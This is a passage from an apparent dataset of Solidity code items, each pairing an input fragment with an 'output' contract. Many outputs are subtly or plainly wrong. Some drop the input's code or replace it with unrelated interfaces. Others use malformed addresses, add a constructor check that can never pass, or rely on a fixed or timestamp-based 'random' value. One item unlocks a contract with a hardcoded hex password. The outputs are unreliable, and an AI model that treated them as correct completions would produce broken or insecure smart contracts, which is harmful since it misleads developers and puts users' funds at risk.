}\n       \n    return (contestants, tie);\n}\n\nfunction booth() public view returns (Election[] memory){\n\n         uint currentIndex = 0;\n         uint total = electionId;\n\n        Election[] memory items = new Election[](total );\n\n        for (\n            uint i = 0;\n            i < electionId;\n            i++) {\n            \n            if (allElections[i + 1].active == true) {\n                uint currentId = allElections[i + 1].electionId;\n                Election storage currentItem = allElections[currentId];\n                items[currentIndex] = currentItem;\n                currentIndex += 1;\n            }\n        }\n        return items;\n   \n    }\n\nfunction myElections() public view returns (Election[] memory){\n\n         uint currentIndex = 0;\n         uint total = electionId;\n\n        Election[] memory items = new Election[](total);\n\n        for (\n            uint i = 0;\n            i < electionId;\n            i++) {\n            \n            if (allElections[i + 1].creator == msg.sender) {\n                uint currentId = allElections[i + 1].electionId;\n                Election storage currentItem = allElections[currentId];\n                items[currentIndex] = currentItem;\n                currentIndex += 1;\n            }\n        }\n        return items;\n   \n    }\n}\n\n\n",
        "output": "//SPDX-License-Identifier: MIT;\npragma solidity ^0.8.0;\n\ninterface IERC20{\n    function balanceOf(address owner) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from,address to,uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ninterface IERC721{\n    function balanceOf(address owner) external view returns (uint256);\n    function setApprovalForAll(address operator, bool _approved) external;\n    function safeTransferFrom(address from,address to,uint256 tokenId) external;\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n}\n\ncontract Vote  {\n    constructor (){}\n\n    uint public candidateId = 0;\n    uint public electionId= 0;\n    mapping (uint => Election) public allElections;\n    mapping(uint => Candidate) allCandidates;\n    mapping(uint => mapping(address => bool)) public voted;\n    string public tie;\n    \n\n\n    struct Election {\n        uint electionId;\n        address creator;\n        address identifier;\n        string details;\n        bool active;\n        Candidate[] candidates;\n    }\n\n    struct Candidate{\n        uint electionId;\n        uint candidateId;\n        string name;\n        uint vote;\n    }\n\n    function setUp( address _identifier, string memory _details , string[] calldata _candidate) public {  \n        electionId++;\n        // NOTE: I retrieve an empty election struct from mapping and set for each field the values.  \n        Election storage election = allElections[electionId];\n        election.electionId = electionId;\n        election.creator = msg.sender;\n        election.identifier = _identifier;\n        election.details = _details;\n        election.active = true;\n\n        for(uint i = 0; i < _candidate.length; i++){\n            candidateId++;\n            Candidate memory candidate = Candidate(electionId,candidateId,_candidate[i],0);\n            allCandidates[candidateId] = candidate;\n            // NOTE: For insert the candidates inside the same election struct, I use election struct retrieved in line 51 and \n            //       then use 'push' method for add single candidate\n            election.candidates.push(candidate);\n        }\n    }\n\n    function start(uint _electionId) public {\n        require(allElections[_electionId].creator == msg.sender, \"only moderator can start an election\");\n        allElections[_electionId].active = true;\n           }\n    \n    function vote(uint _candidateId,uint _electionId ) public {\n        require(voted[_electionId][msg.sender] == false, \"you have already voted\");\n        require(allElections[_electionId].active == true, \"election have not begun\");\n        address identifier = allElections[_electionId].identifier;\n        require(IERC20(identifier).balanceOf(msg.sender) > 0 || IERC721(identifier).balanceOf(msg.sender) > 0,\"only registered voters can vote\");\n\n        allCandidates[_candidateId].vote++;\n\n\n        voted[_electionId][msg.sender] = true;\n    }\n    \n    function announce(uint _electionId) public  returns (Candidate[] memory,string memory) {\n        require(allElections[_electionId].creator == msg.sender, \"only moderators can announce winner\");\n        allElections[_electionId].active = false;\n\n        Candidate[] memory contestants = new Candidate[](candidateId);\n        uint winningVoteCount = 0;\n        uint256 winnerId;\n        uint winningCandidateIndex = 0;\n        for(uint i =0; i < candidateId ; i++){\n            if(allCandidates[i + 1].electionId == _electionId){\n                if (allCandidates[i + 1].vote > winningVoteCount){\n                     winningVoteCount = allCandidates[i + 1].vote;\n                     uint currentId = allCandidates[i + 1].candidateId;\n                        winnerId= currentId;\n\n                      Candidate storage currentItem = allCandidates[currentId];\n                    contestants[winningCandidateIndex] = currentItem;\n                    winningCandidateIndex += 1;\n                        tie=\"\";\n                }else if(allCandidates[i + 1].vote == winningVoteCount){\n                    tie = \"This ended in a tie\";\n                }\n                \n            }\n        }\n       \n    return (contestants, tie);\n}\n\nfunction booth() public view returns (Election[] memory){\n\n         uint currentIndex = 0;\n         uint total = electionId;\n\n        Election[] memory items = new Election[](total );\n\n        /// @notice Loop through all items ever created\n        for (\n            uint i = 0;\n            i < electionId;\n            i++) {\n            \n            /// @notice Get only public item\n            if (allElections[i + 1].active == true) {\n                uint currentId = allElections[i + 1].electionId;\n                Election storage currentItem = allElections[currentId];\n                items[currentIndex] = currentItem;\n                currentIndex += 1;\n            }\n        }\n        return items;\n   \n    }\n\nfunction myElections() public view returns (Election[] memory){\n\n         uint currentIndex = 0;\n         uint total = electionId;\n\n        Election[] memory items = new Election[](total);\n\n        /// @notice Loop through all items ever created\n        for (\n            uint i = 0;\n            i < electionId;\n            i++) {\n            \n            /// @notice Get only public item\n            if (allElections[i + 1].creator == msg.sender) {\n                uint currentId = allElections[i + 1].electionId;\n                Election storage currentItem = allElections[currentId];\n                items[currentIndex] = currentItem;\n                currentIndex += 1;\n            }\n        }\n        return items;\n   \n    }\n}\n\n"
    },
    "348.sol": {
        "input": "mapping (string => uint256) nameToTicketLevel;\n\npragma solidity ^0.8.8;\n\ncontract LevelUp {\n\n    struct Customers {\n        string name;\n        uint256 level;\n    }\n    mapping (address => Customers) customers;\n\n    function addCustomer(string memory _name, uint256 _ticketLevel) public {\n        customers[msg.sender] = Customers(_name, _ticketLevel);\n    }\n\n    function levelUp(string memory _name) public {\n        customers[msg.sender].level++;\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract LevelUp {\n    struct Customers {\n        string name;\n        uint256 level;\n    }\n    mapping (address => Customers) customers;\n\n    function addCustomer(string memory _name, uint256 _ticketLevel) public {\n        customers[msg.sender] = Customers(_name, _ticketLevel);\n    }\n\n    function levelUp(string memory _name) public {\n        customers[msg.sender].level++;\n    }\n\n    mapping (string => uint256) nameToTicketLevel;\n\n    function getTicketLevel(string memory _name) public view returns (uint256) {\n        return nameToTicketLevel[_name];\n    }\n\n    constructor() {\n        nameToTicketLevel[\"bronze\"] = 3;\n        nameToTicketLevel[\"silver\"] = 10;\n        nameToTicketLevel[\"gold\"] = 50;\n        nameToTicketLevel[\"platinum\"] = 100;\n    }\n}\n\n"
    },
    "349.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract PickWinner {\n    address payable[] players;\n    function pickWinner() public {\n        uint256 winnerIndex = 80 % players.length; \n        players[winnerIndex].transfer(address(this).balance); \n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ncontract PickWinner {\n    address payable[] players;\n    function pickWinner() public {\n        uint256 winnerIndex = 80 % players.length; // I chose 80 as a \"random\" value\n        players[winnerIndex].transfer(address(this).balance); \n    }\n}\n\n"
    },
    "351.sol": {
        "input": "pragma solidity ^0.8.0; \n\n\ncontract Test{\n    function test() public pure returns (uint8 [1] memory,uint8 [1] memory) {\n        return ([2],[1]);\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0; \n\n\ncontract Test{\n    function test() public pure returns (uint8 [1] memory,uint8 [1] memory) {\n        return ([2],[1]);\n    }\n}\n\n"
    },
    "352.sol": {
        "input": "pragma solidity 0.8.7;\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n\ncontract SafeMathTest {\n    using SafeMath for uint256;\n\n    function a(uint256 x) external pure returns (uint256 sum) {\n        sum = x.add(1);\n    }\n\n    function b(uint256 x) external pure returns (uint256 sum) {\n        sum = x + 1;\n    }\n}\n\ncontract SafeMathTest2 {\n    using SafeMath for uint256;\n\n    function b(uint256 x) external pure returns (uint256 sum) {\n        sum = x.add(1);\n    }\n\n    function a(uint256 x) external pure returns (uint256 sum) {\n        sum = x + 1;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    library SafeMath {\n        function add(uint256 a, uint256 b) internal pure returns (uint256) {\n            uint256 c = a + b;\n            require(c >= a, \"SafeMath: addition overflow\");\n\n            return c;\n        }\n        function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n            return a - b;\n        }\n        function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n            if (a == 0) {\n                return 0;\n            }\n\n            uint256 c = a * b;\n            require(c / a == b, \"SafeMath: multiplication overflow\");\n\n            return c;\n        }\n\n        function div(uint256 a, uint256 b) internal pure returns (uint256) {\n            return a / b;\n        }\n\n        function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n            return a % b;\n        }\n    }\n\n    interface IMath {\n        function add(uint256 a, uint256 b) external pure returns (uint256);\n    }\n\n"
    },
    "353.sol": {
        "input": "import \"@openzeppelin/contract/token/ERC20/ERC20.sol\";\n\ncontract exampleContract {\n    ERC20 USDTToken = ERC20(\"USDT Contract Address Here\");\n\n    USDTToken.approve(address(this), _amount);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address sender, address recipient, uint256 amount) external returns (bool success);\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool success);\n\n    function approve(address spender, uint256 amount) external returns (bool success);\n\n    function allowance(address owner, address spender) external view returns (uint256 remaining);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "354.sol": {
        "input": " hardhat: {\n      allowUnlimitedContractSize: true,\n    }\n\nimport \"ContractA.sol\";\ncontract Factory {\n A public a;\n function createA() public {\n   a = new A();\n }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IAddress {\n function getCodeSize(bytes data) external returns (uint256);\n function codeSize(string memory _name) public pure returns (uint256);\n}\n\n"
    },
    "355.sol": {
        "input": "    function giveResaleApproval(uint256 tokenId) public {\n        require(\n            ownerOf(tokenId) == msg.sender,\n            \"You must own this NFT in order to resell it\"\n        );\n        setApprovalForAll(contractAddress, true);\n        return;\n    }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract NFT {\n    function ownerOf(uint256 tokenId) public view returns (address owner);\n    function setApprovalForAll(address token, bool status) external;\n    function giveResaleApproval(uint256 tokenId) public;\n    address contractAddress = 0x742d69987876495964461777529248533330080;\n}\n\n"
    },
    "356.sol": {
        "input": "ERC20Token _token = ERC20Token(address(token));\n\nERC20Token _token = new ERC20Token();\n\naddress tokenAddress = address(_token);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20Token {\n\n    string public standard = 'Token 0.1';\n\n    string public name;\n    string public symbol;\n    uint8 public decimals; \n    uint256 public totalSupply;   \n\n    function name () public view returns (string) {\n        return name;\n    }\n    \n    \n     \n     \n    function symbol () public view returns (string) {\n        return symbol; \n    }\n\n    \n     \n     \n    function decimals () public view returns (uint8) {\n        return decimals; \n    }\n\n    \n     \n     \n    function totalSupply () public view returns (uint256) {\n        return totalSupply; \n    }\n\n}\n\ncontract ERC20Receiver {\n\n    address public owner;\n    uint256 public amount;\n\n}\n\n"
    },
    "357.sol": {
        "input": "contract DEXTransferCoinUserToUser is DEXUserCoin {\n}\n\nconstructor (DEXUserCoin _dex){\n    desxUserCoin=_dex;\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a + b;\n  }\n\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a - b;\n  }\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a * b;\n  }\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a / b;\n  }\n\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a % b;\n  }\n\n  function subMod(uint256 a, uint256 b, uint256 m) internal pure returns (uint256) {\n    return a - b % m;\n  }\n}\n\ncontract DEXUserCoin {\n  event UserCoinTransfer(address indexed from, address indexed to, uint256 amount);\n\n  constructor (address _dex) public {\n    desxUserCoin=_dex;\n  }\n\n  address desxUserCoin;\n}\n\n"
    },
    "358.sol": {
        "input": "contract Cloth {\n    struct Clothes {\n        string name;\n        string color;\n    }\n\n    Clothes[5] public clothes;\n    uint counter = 0;\n\n    function addCloth(string calldata _name, string calldata _color) public {\n        require(counter < 5, \"Can't add more clothes. Limit of the array reached.\");\n        clothes[counter] = Clothes(_name,_color);\n        counter++;\n    }\n}\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Cloth {\n    struct Clothes {\n        string name;\n        string color;\n    }\n\n    Clothes[5] public clothes;\n    uint counter = 0;\n\n    function addCloth(string calldata _name, string calldata _color) public {\n        require(counter < 5, \"Can't add more clothes. Limit of the array reached.\");\n        clothes[counter] = Clothes(_name,_color);\n        counter++;\n    }\n}\n"
    },
    "359.sol": {
        "input": "contract TimestampTest {\n   function getTimestampInHMS() public view returns (string memory) {\n      uint256 timestamp = block.timestamp;\n      uint256 _hours = (timestamp / 3600) % 24;\n      uint256 _minutes = (timestamp / 60) % 60;\n      uint256 _seconds = timestamp % 60;\n\n      return string(abi.encodePacked(\n         _hours < 10 ? \"0\" : \"\", toString(_hours), \":\",\n         _minutes < 10 ? \"0\" : \"\", toString(_minutes), \":\",\n         _seconds < 10 ? \"0\" : \"\", toString(_seconds)\n      ));\n   }\n\n   function toString(uint256 val) internal pure returns (string memory) {\n      if (val == 0)\n         return \"0\";\n      uint256 digits;\n      uint256 tmp = val;\n      while (tmp != 0) {\n         digits++;\n         tmp /= 10;\n      }\n      bytes memory newBuffer = new bytes(digits);\n      while (val != 0) {\n         digits -= 1;\n         newBuffer[digits] = bytes1(uint8(48 + val % 10));\n         val = val / 10;\n      }\n      return string(newBuffer);\n   }\n}\n\nconst convertPriceToUSD = (tokenPriceUSD, amount = 27554820000) => {\n    const amountBNB = amount / 10 ** 18;\n    const amountUSD = amountBNB * tokenPriceUSD;\n    return amountUSD;\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TimestampTest {\n   function getTimestampInHMS() public view returns (string memory) {\n      uint256 timestamp = block.timestamp;\n      uint256 _hours = (timestamp / 3600) % 24;\n      uint256 _minutes = (timestamp / 60) % 60;\n      uint256 _seconds = timestamp % 60;\n\n      return string(abi.encodePacked(\n         _hours < 10 ? \"0\" : \"\", toString(_hours), \":\",\n         _minutes < 10 ? \"0\" : \"\", toString(_minutes), \":\",\n         _seconds < 10 ? \"0\" : \"\", toString(_seconds)\n      ));\n   }\n\n   function toString(uint256 val) internal pure returns (string memory) {\n      if (val == 0)\n         return \"0\";\n      uint256 digits;\n      uint256 tmp = val;\n      while (tmp != 0) {\n         digits++;\n         tmp /= 10;\n      }\n      bytes memory newBuffer = new bytes(digits);\n      while (val != 0) {\n         digits -= 1;\n         newBuffer[digits] = bytes1(uint8(48 + val % 10));\n         val = val / 10;\n      }\n      return string(newBuffer);\n   }\n}\n\n"
    },
    "361.sol": {
        "input": "IdToAddress[Id] = address(0x123);\n\nfunction transfer(address _recipient, uint256 _id) public {\n    require(IdToAddress[_id] == msg.sender, \"You're not the current token owner\");\n    IdToAddress[_id] = _recipient;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TransferTo {\n    mapping(uint256 => address) IdToAddress;\n    \n    function transfer(address _recipient, uint256 _id) public {\n        require(IdToAddress[_id] == msg.sender, \"You're not the current token owner\");\n        IdToAddress[_id] = _recipient;\n    }\n\n}\n\n"
    },
    "362.sol": {
        "input": "await contract.unlock(\"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\")\n\n\n",
        "output": "pragma solidity ^0.8.9;\n  abstract contract IF {\n \n    function unlock(bytes32 value) external virtual returns (bool success);\n\n  }\n\n"
    },
    "363.sol": {
        "input": "constructor(address _VRFCoordinator, address _LinkToken, bytes32 _keyhash)\npublic \nVRFConsumerBase(_VRFCoordinator, _LinkToken) \nERC721(\"Snails\", \"SNAIL\") \n{\n    keyHash = _keyhash;\n    fee = 0.1 * 10**18; \n    tokenCounter = 0;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721 {\n    function balanceOf(address account) external view returns (uint256 balance);\n}\n\ninterface IERC1155 {\n    function balanceOf(address account) external view returns (uint256 balance);\n}\n\n"
    },
    "364.sol": {
        "input": "def compile_source_file(file_path):\n    solcx.install_solc(version='0.8.9')\n    solcx.set_solc_version('0.8.9')\n    with open(file_path, 'r') as f:\n        source = f.read()\n        print(source)\n    return solcx.compile_source(source)\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Compiled {\n    function test() {\n        bytes32 x = \"hello world\";\n    }\n}\n\n"
    },
    "365.sol": {
        "input": "keccak256(msg.sender)\n\nuint tmpData = uint160(keccak256(msg.sender))\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract AddressHash {\n    \n     function hashAddress(address _addr) public view returns(uint256) {\n        uint256 hashAddr = uint256(keccak256(_addr));\n        return hashAddr;\n    }\n    \n     function hashAddressHex(address _addr) public view returns(uint256) {\n        uint256 hashAddr = uint256(keccak256(_addr));\n        return hashAddr;\n    }\n    \n     function hashAddressShort(address _addr) public view returns(uint256) {\n        uint256 hashAddr = uint256(keccak256(_addr));\n        return hashAddr;\n    }\n    \n}\n\n"
    },
    "366.sol": {
        "input": "contract Category is Post {\n  function isCategoryExists(uint256 index) external view returns (bool) {\n    if (categories[index].isExist) {\n      return true;\n    }\n    return false;\n  }\n  createPost(){}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IPost {\n  function createPost(\n    string calldata title,\n    string calldata text,\n    string calldata image,\n    uint8 category\n  ) external payable;\n}\n\ninterface IPost2 {\n  function isCategoryExists(uint256 index) external view returns (bool);\n}\n\n"
    },
    "367.sol": {
        "input": "function validateAdditionalCalldata() pure external returns (bool, address) {\n    bytes memory additionalCalldataMemory = hex\"0000000000000000000000000000000000000000000000000000000000000001\";\n    bool decoded1 = abi.decode(additionalCalldataMemory, (bool));\n    address decoded2 = abi.decode(additionalCalldataMemory, (address));\n\n    return (decoded1, decoded2);\n}\n\npragma solidity ^0.8;\n\ncontract FooResolver {\n    function validateAdditionalCalldata() external view returns (bool, address) {\n        bytes memory additionalCalldataMemory = hex\"0000000000000000000000000000000000000000000000000000000000000002\";\n\n        bool decoded1;\n        try this.decodeToBool(additionalCalldataMemory) returns (bool decodedValue) {\n            decoded1 = decodedValue;\n        } catch {\n            decoded1 = false;\n        }\n\n        address decoded2 = abi.decode(additionalCalldataMemory, (address));\n\n        return (decoded1, decoded2);\n    }\n\n    function decodeToBool(bytes memory data) external pure returns (bool) {\n        return abi.decode(data, (bool));\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FooResolver {\n    function validateAdditionalCalldata() external view returns (bool, address) {\n        bytes memory additionalCalldataMemory = hex\"0000000000000000000000000000000000000000000000000000000000000001\";\n        bool decoded1 = abi.decode(additionalCalldataMemory, (bool));\n        address decoded2 = abi.decode(additionalCalldataMemory, (address));\n\n        return (decoded1, decoded2);\n    }\n\n    function decodeToBool(bytes memory data) external pure returns (bool) {\n        return abi.decode(data, (bool));\n    }\n}\n\n"
    },
    "369.sol": {
        "input": "contract TestCoin is ERC20, Ownable {\n    *********\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address who) external view returns (uint256);\n    function transfer(address to, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n    function approve(address spender, uint256 value) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface Ownable {\n    function owner() external view returns (address);\n    function transferOwnership(address newOwner) external returns (bool);\n}\n\n"
    },
    "370.sol": {
        "input": "pragma solidity >0.4.23 <0.9.0;\n\nimport { Clones } from \"@openzeppelin/contracts/proxy/Clones.sol\";\n\ncontract NebCrewFactory {\n\n    NebCrew[] public NebCrewAddresses;\n    address public implementationAddress;\n    function addNebCrew() public {\n\n        NebCrew nebCrewAddress = NewCrew(Clones.clone(implementationAddress));\n\n        nebCrewAddress.initialize(); \n\n        NebCrewAddresses.push(nebCrewAddress);\n    }\n}\n\ncontract NebCrew{\n\n    address public crew;\n\n    initialize() {\n        require(crew == address(0), \"already initialized\");\n        crew = msg.sender;\n    }\n\n    function welcomeCrew() public pure returns (string memory _greeting) {\n        return \"Welcome to the truth...\";\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IBinaryCrew {\n    function welcomeCrew() external returns (string memory);\n}\n\ninterface IClones {\n    function clone(address) external returns (address);\n}\n\ncontract NewCrew {\n\n    function initialize() public pure;\n}\n\ncontract IFactory {\n    function create(address) external returns (address);\n}\n\n"
    },
    "371.sol": {
        "input": "function getGreetings() public view returns (string calldata)\n\nfunction foo(string calldata inputString) public pure returns (string calldata) {\n    return inputString;\n}\n\nfunction getGreetings() public view returns (string memory) {\n    return message;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Greeter {\n\n\tstring private message;\n\n\tconstructor () {\n\t    message = \"Hello, world!\";\t    \n\t}\n\n\tfunction getGreetings() public view returns (string memory) {\n\t    return message;\n\t}\n\n\tfunction foo(string memory inputString) public pure returns (string memory) {\n\t    return inputString;\n\t}\n}\n\n"
    },
    "372.sol": {
        "input": "var input = {\n  language: 'Solidity',\n  sources: {\n    'project:/contracts/test.sol': {\n      content: 'contract C { function f() public { } }'\n    }\n  },\n  settings: {\n    outputSelection: {\n      '*': {\n        '*': ['*']\n      }\n    }\n  }\n};\n\nvar input = {\n  language: 'Solidity',\n  sources: {\n    'contracts/test.sol': {\n      content: 'contract C { function f() public { } }'\n    }\n  },\n  settings: {\n    outputSelection: {\n      '*': {\n        '*': ['*']\n      }\n    }\n  }\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract C {\n    function f() public { }\n}\n\n"
    },
    "373.sol": {
        "input": "mapping(address => Participant) public _participantMap;\n\nfunction participate() external payable {\n    require(msg.value == 2 ether,\"The amount must be equal to 2 Ethers\");\n    if (_participantMap[msg.sender].participantAddr == address(0)) {\n        _participantMap[msg.sender] = Participant(msg.sender, 1);\n    } else {\n        _participantMap[msg.sender].noOfLotts += 1;\n    }\n}\n\nimport { ethers } from \"hardhat\";\n\nasync function main() {\n    const [owner, userOne, userTwo] = await ethers.getSigners();\n\n    const contractAddress = process.env.LOTTERY_CONTRACT_ADDRESS;\n\n    const Lottery = await ethers.getContractFactory(\"Lottery\");\n    const contractInstance = await Lottery.attach(`${contractAddress}`);\n    await contractInstance.connect(userOne).participate({\n        value: ethers.utils.parseUnits(\"2\", \"ether\"),\n    });\n\n    const participant = await contractInstance._participantMap(`${userOne.address}`);\n    console.log(participant);\n}\n\nmain().catch((error) => {\n    console.error(error);\n    process.exitCode = 1;\n});\n\nnpx hardhat run scripts/2_participate.ts --network localhost\n[\n  '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  BigNumber { value: \"1\" },\n  participantAddr: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  noOfLotts: BigNumber { value: \"1\" }\n]\n\nnpx hardhat run scripts/2_participate.ts --network localhost\n[\n  '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  BigNumber { value: \"2\" },\n  participantAddr: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  noOfLotts: BigNumber { value: \"2\" }\n]\n\nnpx hardhat run scripts/2_participate.ts --network localhost\n[\n  '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  BigNumber { value: \"3\" },\n  participantAddr: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  noOfLotts: BigNumber { value: \"3\" }\n]\n\nCompiled 1 Solidity file successfully\n[\n  '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',\n  BigNumber { value: \"1\" },\n  participantAddr: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',\n  noOfLotts: BigNumber { value: \"1\" }\n]\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lottery {\n    struct Participant {\n        address participantAddr;\n        uint noOfLotts;\n    }\n\n    mapping(address => Participant) public _participantMap;\n\n    function participate() external payable {\n        require(msg.value == 2 ether,\"The amount must be equal to 2 Ethers\");\n        \n        if (_participantMap[msg.sender].participantAddr == address(0)) {\n            _participantMap[msg.sender] = Participant(msg.sender, 1);\n        } else {\n            _participantMap[msg.sender].noOfLotts += 1;\n        }\n    }\n}\n\n"
    },
    "374.sol": {
        "input": "contract YourContract {\n    function pullTokens() external {\n        tokenContract.transferFrom(msg.sender, address(this), amount);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract YourContract {\n    IERC20 public tokenContract; \n    \n    function YourContract() public {\n        tokenContract = IERC20(0x7B23915091592061650352169472183736104356);\n    }\n    function pullTokens() external {\n        tokenContract.transferFrom(msg.sender, address(this), amount);\n    }\n\n    \n    uint256 public amount; \n}\n\n"
    },
    "375.sol": {
        "input": "pragma solidity ^0.8.9;\n\ncontract Person{\n    string public FirstName;\n    string public LastName;\n}\n\ncontract Family{\n    Person[] public People;\n\n    function addPerson(Person person) public {\n        People.push(person);\n    }\n}\n\ncontract FamilyManager{\n    Family[] Families;\n\n    function AddFamily(Person[] memory people) public {\n        Family family = new Family();\n        for(uint x; x < people.length; x++) {\n            family.addPerson(people[x]);\n        }\n        Families.push(family);\n    }\n\n    function GetFamilies() public view returns (Family[] memory){\n        return Families;\n    }\n}\n\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\ncontract Person{\n    string public FirstName;\n    string public LastName;\n}\n\ncontract Family{\n    Person[] public People;\n\n    function addPerson(Person person) public {\n        People.push(person);\n    }\n}\n\ncontract FamilyManager{\n    Family[] Families;\n\n    function AddFamily(Person[] memory people) public {\n        Family family = new Family();\n        for(uint x; x < people.length; x++) {\n            family.addPerson(people[x]);\n        }\n        Families.push(family);\n    }\n\n    function GetFamilies() public view returns (Family[] memory){\n        return Families;\n    }\n}\n\n\n"
    },
    "376.sol": {
        "input": "pragma solidity ^0.8.6;\ncontract mycontract{\n\n    address owner;\n    string name;\n    bool visible;\n    uint16 count;\n\nconstructor () {\n    owner=msg.sender;    \n}\n\n    function changname (string memory _name) public returns (string memory){\n        if(msg.sender==owner){\n            name=_name;\n            return \"sucsesss\";\n        }else{\n            return \"acsess denid\";\n        }\n    }\n\n    function showname () view public returns(string memory){\n        return name;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.6;\ncontract mycontract{\n\n    address owner;\n    string name;\n    bool visible;\n    uint16 count;\n\nconstructor () {\n    owner=msg.sender;    \n}\n\n    function changname (string memory _name) public returns (string memory){\n        if(msg.sender==owner){\n            name=_name;\n            return \"sucsesss\";\n        }else{\n            return \"acsess denid\";\n        }\n    }\n\n    function showname () view public returns(string memory){\n        return name;\n    }\n}\n\n"
    },
    "377.sol": {
        "input": "const DEFAULT_COMPILER_SETTINGS = {\n  version: '0.8.8',\n}\n\nconst LOWEST_OPTIMIZER_COMPILER_SETTINGS = {\n  version: '0.6.0',\n  settings: {\n    evmVersion: 'istanbul',\n    optimizer: {\n      enabled: true,\n      runs: 1_000,\n    },\n    metadata: {\n      bytecodeHash: 'none',\n    },\n  },\n}\n\nsolidity: {\n    compilers: [DEFAULT_COMPILER_SETTINGS],\n    overrides: {\n      'contracts/MockV3Aggregator.sol': LOW_OPTIMIZER_COMPILER_SETTINGS,\n     \n    },\n  },\n\npragma solidity >=0.7.0 <0.9.0;\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary MockV3AggregatorLib {\n  function getRandom() internal view returns (uint256) {\n    return uint256(uint(keccak256(abi.encodePacked(block.timestamp))) % 100);\n  }\n}\n\ncontract MockV3Aggregator {\n  uint256[] public prices;\n  uint256[] public amounts;\n\n  constructor(uint256[] memory _prices, uint256[] memory _amounts) {\n    prices = _prices;\n    amounts = _amounts;\n  }\n\n  function getPrices() external view returns (uint256[] memory) {\n    return prices;\n  }\n\n  function getAmounts() external view returns (uint256[] memory) {\n    return amounts;\n  }\n}\n\n"
    },
    "378.sol": {
        "input": "contract Parent {\n    uint256 public number; \n    uint256 internal otherNumber; \n    uint256 private anotherNumber; \n}\n      \ncontract Child is Parent {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Parent {\n    uint256 public number; // Child can write, others can only read\n    uint256 internal otherNumber; // Child can write, others cannot read\n    uint256 private anotherNumber; // no other contract can read\n}\n      \ncontract Child is Parent {\n}\n\n"
    },
    "379.sol": {
        "input": "    constructor(){\n        require(owner == msg.sender);  \n        owner = msg.sender;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Custodial {\n    address owner;\n\n    constructor(){\n        require(owner == msg.sender);  \n        owner = msg.sender;\n    }\n\n    function changeOwner(address newOwner) public {\n        require(owner == msg.sender);  \n        owner=newOwner;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n}\n\n"
    },
    "380.sol": {
        "input": "contract YourToken is ERC721 {\n  ERC20 private immutable token;\n\n  constructor(ERC20 t) {\n    token = t;\n  }\n\n  function transferFrom(address _from, address _to, uint256 _tokenId) public payable {\n    token.transferFrom(_from, _to, 10);\n  }\n}\n\n\n",
